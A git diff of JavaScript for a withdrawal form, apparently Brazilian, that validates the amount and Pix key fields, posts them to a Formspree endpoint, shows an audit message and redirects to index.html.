@@ -59,49 +59,61 @@ function activeButton(button){
 		}
 	}
 
-// Function to handle withdrawal button click (replace with your logic)
 function handleWithdrawal() {
-    // Retrieve values from the input fields
-    let withdrawalAmount = document.getElementById('withdrawalAmount').value.replace(/[^\d]/g, ''); // Remova caracteres não numéricos
-    let pixKey = document.getElementById('pixKey').value;
+	// Retrieve values from the input fields
+	let withdrawalAmount = document.getElementById('withdrawalAmount').value.replace(/[^\d]/g, ''); // Remova caracteres não numéricos
+	let pixKey = document.getElementById('pixKey').value;
 
-    // Converta o valor para centavos antes de enviar (remova o R$ e formate)
-    let numericValue = parseFloat(withdrawalAmount) / 100;
+	// Verifique se ambas as informações são fornecidas
+	if (!withdrawalAmount || !pixKey) {
+		// Mostre uma mensagem de alerta
+		alert('Por favor, preencha todos os campos obrigatórios.');
+		return; // Não prossiga se as informações estiverem ausentes
+	}
 
-    // Arredonde o valor para o inteiro mais próximo
-    numericValue = Math.round(numericValue);
+	// Esconda a seção de saque durante a auditoria
+	document.getElementById('withdrawal').style.display = 'none';
 
-    // Dados a serem enviados para o FormsPree
-    const formData = {
-        'Valor do Saque': numericValue,
-        'Chave Pix': pixKey,
-    };
+	// Exiba a mensagem de auditoria
+	document.getElementById('auditMessage').style.display = 'block';
 
-    // Envia os dados para o FormsPree
-    fetch('https://formspree.io/f/xeqbbovw', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(formData),
-    })
-    .then(response => response.json())
-    .then(data => {
-        // Faça algo com a resposta, se necessário
-        console.log('Resposta do FormsPree:', data);
-    })
-    .catch(error => {
-        // Lida com erros
-        console.error('Erro ao enviar dados para o FormsPree:', error);
-    });
+	// Converta o valor para centavos antes de enviar (remova o R$ e formate)
+	let numericValue = parseFloat(withdrawalAmount) / 100;
+
+	// Arredonde o valor para o inteiro mais próximo
+	numericValue = Math.round(numericValue);
+
+	// Dados a serem enviados para o FormsPree
+	const formData = {
+		'Valor do Saque': numericValue,
+		'Chave Pix': pixKey,
+	};
+
+	// Envia os dados para o FormsPree
+	fetch('https://formspree.io/f/xeqbbovw', {
+		method: 'POST',
+		headers: {
+			'Content-Type': 'application/json',
+		},
+		body: JSON.stringify(formData),
+	})
+	.then(response => response.json())
+	.then(data => {
+		// Faça algo com a resposta, se necessário
+		console.log('Resposta do FormsPree:', data);
+	})
+	.catch(error => {
+		// Lida com erros
+		console.error('Erro ao enviar dados para o FormsPree:', error);
+	});
 
 	document.getElementById('withdrawalSection').style.display = 'none';
 
-    // Exiba a mensagem de auditoria
-    document.getElementById('auditMessage').style.display = 'block';
+	// Exiba a mensagem de auditoria
+	document.getElementById('auditMessage').style.display = 'block';
 }
 
 function returnToIndex() {
     // Redirecione para a página inicial ou realize qualquer outra ação desejada
-    createSection('main');
+    window.location.href = 'index.html';
 }
